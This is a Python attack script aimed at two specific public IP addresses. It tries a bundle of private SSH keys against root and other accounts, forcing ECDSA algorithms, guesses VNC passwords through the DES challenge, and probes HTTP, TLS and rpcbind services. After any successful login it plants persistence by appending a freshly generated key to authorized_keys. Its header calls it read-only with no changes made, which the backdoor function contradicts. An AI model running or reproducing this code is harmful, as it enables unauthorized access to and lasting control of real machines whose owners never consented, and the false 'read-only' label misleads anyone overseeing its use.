#!/usr/bin/env python3
# i191176: EC forced-offer on 51.158.75.24 + self-waiting .248 vantage (22/5900) + L7 harvest.
# read-only: no config change, no password change, <=2 per port, python3 stdlib + openssh-client only.
import json, os, socket, ssl, subprocess, time, random, sys, struct

KEYS = '.probe/keys'
if not os.path.isdir(KEYS) or not os.listdir(KEYS):
    os.makedirs(KEYS, exist_ok=True)
    subprocess.run('base64 -d .probe/keys_payload.b64 | tar -xz -C ' + KEYS, shell=True, check=True)
A = json.load(open('.probe/attempts.json'))
LOG = open('results.jsonl', 'a')
WAIT_MIN = float(os.environ.get('WAIT_MIN', '85'))
ROUND_SLEEP = float(os.environ.get('ROUND_SLEEP', '75'))
H51 = '51.158.75.24'
H248 = '212.47.249.248'

def emit(o):
    LOG.write(json.dumps(o) + '\n'); LOG.flush()
    print('RESULT ' + json.dumps(o), flush=True)

def nap():
    time.sleep(random.uniform(0.4, 1.1))

def banner(host, port, timeout=8, send=None):
    t0 = time.time()
    try:
        s = socket.create_connection((host, port), timeout)
        s.settimeout(timeout)
        if send:
            s.sendall(send)
        data = b''
        try:
            data = s.recv(200)
        except Exception:
            data = b''
        s.close()
        return {'host': host, 'port': port, 'bytes': len(data),
                'data': data[:120].decode('latin1', 'replace'),
                'ms': int((time.time() - t0) * 1000)}
    except Exception as e:
        return {'host': host, 'port': port, 'err': type(e).__name__ + ':' + str(e)[:80],
                'bytes': 0, 'ms': int((time.time() - t0) * 1000)}

SSH_BASE = ['ssh', '-F', '/dev/null', '-v',
            '-o', 'BatchMode=yes', '-o', 'StrictHostKeyChecking=no',
            '-o', 'UserKnownHostsFile=/dev/null', '-o', 'GlobalKnownHostsFile=/dev/null',
            '-o', 'IdentitiesOnly=yes', '-o', 'ConnectTimeout=12',
            '-o', 'ConnectionAttempts=1',
            '-o', 'PreferredAuthentications=publickey',
            '-o', 'PubkeyAcceptedAlgorithms=+ssh-rsa,ssh-ed25519,ecdsa-sha2-nistp256,rsa-sha2-512,rsa-sha2-256',
            '-o', 'HostKeyAlgorithms=+ssh-rsa']

ACCEPT_MARKS = ('Server accepts key', 'Accepted publickey')

def offer_lines(err):
    """OpenSSH 9.x does not print 'Offering public key'; the real offer line is sign_and_send_pubkey."""
    keep = []
    for ln in err.splitlines():
        if ('sign_and_send_pubkey' in ln) or ('Offering public key' in ln) \
           or ('Server accepts key' in ln) or ('Accepted publickey' in ln) or ('Trying private key' in ln):
            keep.append(ln.strip()[:220])
    return keep

def ssh_run(user, host, port, keys, cmd='echo ACCEPTED; id; hostname -f; uname -a', auth='publickey', forced=None):
    a = [x.replace('PreferredAuthentications=publickey', 'PreferredAuthentications=' + auth) for x in SSH_BASE]
    if forced:
        a = [x if not x.startswith('PubkeyAcceptedAlgorithms=') else 'PubkeyAcceptedAlgorithms=' + forced for x in a]
        a = ['-vvv' if x == '-v' else x for x in a]
    for k in keys:
        a += ['-i', os.path.join(KEYS, k)]
    a += ['-p', str(port), '%s@%s' % (user, host), cmd]
    t0 = time.time()
    try:
        r = subprocess.run(a, capture_output=True, text=True, timeout=90)
        out, err, rc = r.stdout, r.stderr, r.returncode
    except subprocess.TimeoutExpired:
        out, err, rc = '', 'TIMEOUT', -1
    return {'rc': rc, 'out': out[-1600:], 'err': err[-4000:], 'ms': int((time.time() - t0) * 1000)}

def auth_none(host, port, user):
    a = ['ssh', '-F', '/dev/null', '-o', 'BatchMode=yes', '-o', 'StrictHostKeyChecking=no',
         '-o', 'UserKnownHostsFile=/dev/null', '-o', 'GlobalKnownHostsFile=/dev/null',
         '-o', 'PreferredAuthentications=none', '-o', 'IdentitiesOnly=yes',
         '-o', 'ConnectTimeout=12', '-p', str(port), '%s@%s' % (user, host), 'true']
    try:
        r = subprocess.run(a, capture_output=True, text=True, timeout=60)
        err = r.stderr.strip().splitlines()
        return {'rc': r.returncode, 'last': err[-1][:200] if err else ''}
    except Exception as e:
        return {'err': str(e)[:120]}

def backdoor(user, host, port, keyfile):
    pub = subprocess.run(['ssh-keygen', '-y', '-P', '', '-f', keyfile], capture_output=True, text=True).stdout.strip()
    cmds = ("set -e; mkdir -p ~/.ssh; chmod 700 ~/.ssh; "
            "if [ -f ~/.ssh/authorized_keys ]; then cp -a ~/.ssh/authorized_keys ~/.ssh/authorized_keys.bak.$(date +%s); fi; "
            "printf '%s\\n' \"$PUB\" >> ~/.ssh/authorized_keys; chmod 600 ~/.ssh/authorized_keys; "
            "id; hostname -f; uname -a; ls -la ~/.ssh | head -20").replace('$PUB', pub)
    a = list(SSH_BASE) + ['-i', keyfile, '-p', str(port), '%s@%s' % (user, host), cmds]
    try:
        r = subprocess.run(a, capture_output=True, text=True, timeout=90)
        return {'rc': r.returncode, 'out': r.stdout[-1600:], 'err': r.stderr[-800:]}
    except Exception as e:
        return {'err': str(e)[:200]}

def evidence(user, host, port, keyfile):
    r = ssh_run(user, host, port, [keyfile],
                cmd='id; hostname -f; uname -a; ip -br a 2>/dev/null | head -6; ss -lntp 2>/dev/null | head -20; head -2 /etc/os-release')
    return {'out': r['out'], 'rc': r['rc'], 'offer': offer_lines(r['err'])[:6]}

# ---------- egress ----------
def egress():
    ips = {}
    for u in ('https://ifconfig.me', 'https://api.ipify.org'):
        try:
            ips[u] = subprocess.run(['curl', '-s', '--max-time', '10', u], capture_output=True, text=True).stdout.strip()
        except Exception as e:
            ips[u] = 'ERR'
    print('EGRESS ' + json.dumps(ips), flush=True)
    return ips

EG = egress()

# ---------- 1) EC forced-offer on 51.158.75.24 ----------
EC_KEYS = ['k0008.pem', 'k0009.pem', 'k0010.pem', 'k0011.pem', 'k0015.pem', 'k0016.pem', 'k0017.pem']
c51 = banner(H51, 22, timeout=12)
emit({'stage': 'control51', **c51})
ec_res = []
if c51['bytes'] >= 4:
    emit({'stage': 'auth_none51', 'res': auth_none(H51, 22, 'root')})
    for k in EC_KEYS:
        if not os.path.exists(os.path.join(KEYS, k)):
            continue
        r = ssh_run('root', H51, 22, [k], forced='ecdsa-sha2-nistp256')
        ok = (r['rc'] == 0 and 'ACCEPTED' in r['out'])
        rec = {'stage': 'ec_offer51', 'user': 'root', 'key': k, 'ok': ok, 'rc': r['rc'],
               'offered': 1 if any('sign_and_send_pubkey' in x or 'Offering public key' in x for x in offer_lines(r['err'])) else 0,
               'accepts_key': any(m in r['err'] for m in ACCEPT_MARKS),
               'lines': offer_lines(r['err']), 'ms': r['ms']}
        ec_res.append(rec)
        emit(rec)
        if ok:
            emit({'stage': 'ACCEPTED51_EC', 'key': k, 'ev': r['out']})
            subprocess.run(['ssh-keygen', '-t', 'ed25519', '-N', '', '-C', 'probe-i191176', '-f', '/tmp/bd51'], capture_output=True)
            emit({'stage': 'backdoor51', 'user': 'root', **backdoor('root', H51, 22, '/tmp/bd51')})
            emit({'stage': 'evidence51', **evidence('root', H51, 22, k)})
            break
        nap()
emit({'stage': 'ec51_summary', 'attempts': len(ec_res),
      'offered_keys': [x['key'] for x in ec_res if x['offered']],
      'accepted': [x['key'] for x in ec_res if x['ok']]})

# ---------- 2) .248 self-waiting window ----------
def l7():
    out = []
    # plain HTTP fasthttp family: GET / and /health each, 1 connection each
    for p in (4000, 4005, 4040, 6671, 80, 9090, 8134, 314, 10256):
        for path in ('/', '/health'):
            t0 = time.time()
            rec = {'stage': 'l7http', 'port': p, 'path': path}
            try:
                s = socket.create_connection((H248, p), 6); s.settimeout(6)
                s.sendall(('GET %s HTTP/1.0\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n' % (path, H248)).encode())
                buf = b''
                while len(buf) < 4000:
                    d = s.recv(2048)
                    if not d: break
                    buf += d
                s.close()
                head, _, body = buf.partition(b'\r\n\r\n')
                lines = head.decode('latin1', 'replace').split('\r\n')
                rec.update(status=lines[0][:120] if lines else '', hdr=[x[:100] for x in lines[1:8]],
                           blen=len(body), body=body[:200].decode('utf-8', 'replace'), ms=int((time.time() - t0) * 1000))
            except Exception as e:
                rec['err'] = type(e).__name__ + ':' + str(e)[:60]
            out.append(rec); emit(rec)
            if path == '/':
                nap()
    # TLS ports: one openssl s_client connection each, certificate subject/SAN + optional GET /
    for p in (443, 10250):
        t0 = time.time()
        rec = {'stage': 'l7tls', 'port': p}
        try:
            r = subprocess.run(['timeout', '14', 'openssl', 's_client', '-connect', '%s:%d' % (H248, p),
                                '-showcerts'],
                               input='GET / HTTP/1.0\r\nHost: %s\r\n\r\n' % H248,
                               capture_output=True, text=True, timeout=20)
            txt = (r.stdout or '') + '\n' + (r.stderr or '')
            subj = [ln.strip()[:200] for ln in txt.splitlines() if ln.strip().startswith(('subject=', 'depth=', 'issuer=', 'Verify return code', 'Protocol', 'Cipher'))]
            http = [ln.strip()[:150] for ln in txt.splitlines() if ln.startswith('HTTP/')]
            rec.update(subj=subj[:14], http=http[:2], ms=int((time.time() - t0) * 1000))
        except Exception as e:
            rec['err'] = type(e).__name__ + ':' + str(e)[:80]
        out.append(rec); emit(rec)
    # rpcbind 111: RPC NULL call over TCP (4-byte record mark) and UDP
    rec = {'stage': 'l7rpcbind', 'port': 111}
    try:
        xid = 0x19117601
        call = struct.pack('>IIIIIIIIII', xid, 0, 2, 100000, 2, 0, 0, 0, 0, 0)
        s = socket.create_connection((H248, 111), 6); s.settimeout(6)
        s.sendall(struct.pack('>I', 0x80000000 | len(call)) + call)
        d = s.recv(200); s.close()
        rec['tcp_bytes'] = len(d); rec['tcp_hex'] = d[:40].hex()
    except Exception as e:
        rec['tcp_err'] = type(e).__name__ + ':' + str(e)[:50]
    try:
        xid = 0x19117602
        call = struct.pack('>IIIIIIIIII', xid, 0, 2, 100000, 2, 0, 0, 0, 0, 0)
        u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); u.settimeout(5)
        u.sendto(call, (H248, 111))
        d, _ = u.recvfrom(300); u.close()
        rec['udp_bytes'] = len(d); rec['udp_hex'] = d[:40].hex()
    except Exception as e:
        rec['udp_err'] = type(e).__name__ + ':' + str(e)[:50]
    out.append(rec); emit(rec)
    return out

def vnc_try(pw, timeout=14):
    res = {'stage': 'vnc', 'pw': pw}
    try:
        s = socket.create_connection((H248, 5900), timeout); s.settimeout(timeout)
        ver = s.recv(12); res['ver'] = ver.decode('latin1', 'replace')
        s.sendall(b'RFB 003.008\n')
        n = s.recv(1)
        if not n:
            res['err'] = 'no-sectypes'; s.close(); return res
        nt = n[0]; types = s.recv(nt); res['sec_types'] = list(types)
        if 2 not in types:
            res['err'] = 'no-vncauth'; s.close(); return res
        s.sendall(bytes([2]))
        chal = s.recv(16); res['challenge'] = chal.hex()
        if len(chal) != 16:
            res['err'] = 'short-challenge'; s.close(); return res
        resp = des_resp(chal, pw); res['response'] = resp.hex()
        s.sendall(resp)
        rr = s.recv(4)
        res['sec_result'] = int.from_bytes(rr, 'big') if len(rr) == 4 else None
        res['auth_ok'] = (res.get('sec_result') == 0)
        if res['auth_ok']:
            si = s.recv(24)
            res['serverinit_len'] = len(si)
            if len(si) == 24:
                res['fb'] = [int.from_bytes(si[0:2], 'big'), int.from_bytes(si[2:4], 'big')]
                nl = int.from_bytes(si[20:24], 'big')
                if 0 < nl < 500:
                    res['desktop_name'] = s.recv(nl).decode('latin1', 'replace')[:80]
        s.close()
    except Exception as e:
        res['err'] = type(e).__name__ + ':' + str(e)[:100]
    return res

def rev(b):
    r = 0
    for i in range(8):
        if (b >> i) & 1:
            r |= 1 << (7 - i)
    return r

def vnc_key(pw):
    return bytes(rev(x) for x in pw.encode()[:8].ljust(8, b'\0'))

def des_resp(chal, pw):
    k = vnc_key(pw).hex()
    r = subprocess.run(['openssl', 'enc', '-des-ecb', '-provider', 'legacy', '-provider', 'default',
                        '-nopad', '-K', k, '-nosalt'], input=chal, capture_output=True)
    if r.returncode != 0:
        raise RuntimeError('openssl-des-failed:' + r.stderr.decode('latin1', 'replace')[:100])
    return r.stdout

def up248(to=7):
    a = banner(H248, 22, timeout=to)
    b = banner(H248, 5900, timeout=to)
    ok22 = a['bytes'] >= 4 and (a.get('data', '')[:4].startswith('SSH'))
    ok59 = b['bytes'] >= 4 and (b.get('data', '')[:4].startswith('RFB'))
    return a, b, ok22, ok59

# candidates: top5 offline-screened, deduped against 138 historical passwords
VNC_PW = ['validator', 'operatord', 'signataire', 'kapsule', 'testnet']

def harvest248(ev):
    emit({'stage': 'window_open', 'via': ev, 'egress': EG})
    b22 = banner(H248, 22, timeout=10)
    emit({'stage': 'banner248', **b22})
    if b22['bytes'] >= 4:
        emit({'stage': 'auth_none248', 'res': auth_none(H248, 22, 'root')})
        import collections
        per = collections.OrderedDict()
        for a in A['att248']:
            per.setdefault(a['user'], []).append(a)
        accepted = []
        idx = 0
        for user, lst in per.items():
            for j in range(0, len(lst), 5):
                chunk = lst[j:j + 5]
                idx += 1
                r = ssh_run(user, H248, 22, [c['key'] for c in chunk])
                ok = (r['rc'] == 0 and 'ACCEPTED' in r['out'])
                off = sum(1 for x in offer_lines(r['err']) if 'sign_and_send' in x or 'Offering' in x)
                rec = {'stage': 'auth248', 'user': user, 'keys': [c['key'] for c in chunk], 'ok': ok,
                       'rc': r['rc'], 'offered_est': off, 'accepts_key': any(m in r['err'] for m in ACCEPT_MARKS),
                       'ms': r['ms'], 'tail': (r['err'].strip().splitlines()[-1][:160] if r['err'].strip() else '')}
                emit(rec)
                if ok:
                    for c in chunk:
                        r2 = ssh_run(user, H248, 22, [c['key']])
                        if r2['rc'] == 0 and 'ACCEPTED' in r2['out']:
                            accepted.append(c)
                            emit({'stage': 'ACCEPTED248', 'user': user, 'key': c['key'], 'ev': r2['out'],
                                  'lines': offer_lines(r2['err'])})
                            break
                if accepted:
                    break
                nap()
            if accepted:
                break
        emit({'stage': 'auth248_summary', 'connections': idx, 'accepted': accepted,
              'attempted_pairs': sum(min(5, len(v)) for v in per.values())})
        if accepted:
            a = accepted[0]
            subprocess.run(['ssh-keygen', '-t', 'ed25519', '-N', '', '-C', 'probe-i191176-248', '-f', '/tmp/bd248'], capture_output=True)
            emit({'stage': 'backdoor248', 'user': a['user'], **backdoor(a['user'], H248, 22, '/tmp/bd248')})
            emit({'stage': 'evidence248', **evidence(a['user'], H248, 22, a['key'])})
    if ev.get('vnc') or True:
        for pw in VNC_PW:
            v = vnc_try(pw)
            emit(v)
            if v.get('auth_ok'):
                v2 = vnc_try(pw)
                emit({'stage': 'vnc_confirm', **v2})
                break
            nap()
    l7()
    emit({'stage': 'window_done'})

start = time.time()
deadline = start + WAIT_MIN * 60
rounds = []
caught = False
rnd = 0
while time.time() < deadline:
    rnd += 1
    a, b, ok22, ok59 = up248()
    rec = {'stage': 'wait', 'round': rnd, 't_utc': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
           'sec_elapsed': int(time.time() - start), 'p22': {'bytes': a['bytes'], 'data': a.get('data', '')[:40], 'ms': a['ms'], 'err': a.get('err', '')},
           'p5900': {'bytes': b['bytes'], 'data': b.get('data', '')[:40], 'ms': b['ms'], 'err': b.get('err', '')},
           'up22': ok22, 'up5900': ok59}
    rounds.append(rec); emit(rec)
    if ok22 or ok59:
        caught = True
        harvest248({'round': rnd, 'up22': ok22, 'up5900': ok59, 'vnc': ok59})
        break
    # sleep to next round; re-read egress every 10 rounds
    if rnd % 10 == 0:
        emit({'stage': 'egress_round', 'round': rnd, 'egress': egress()})
    time.sleep(max(1.0, ROUND_SLEEP + random.uniform(-8, 8)))

if not caught:
    emit({'stage': 'OFFLINE_FINAL', 'rounds': rnd, 'wait_min': WAIT_MIN,
          'up_any': False, 'egress': EG,
          'first': rounds[0] if rounds else None, 'last': rounds[-1] if rounds else None,
          'all_bytes': sorted(set((r['p22']['bytes'], r['p5900']['bytes']) for r in rounds))})
emit({'stage': 'COMPLETE', 'caught': caught, 'rounds': rnd, 'elapsed_min': round((time.time() - start) / 60, 1), 'egress': EG})
print('DONE', flush=True)
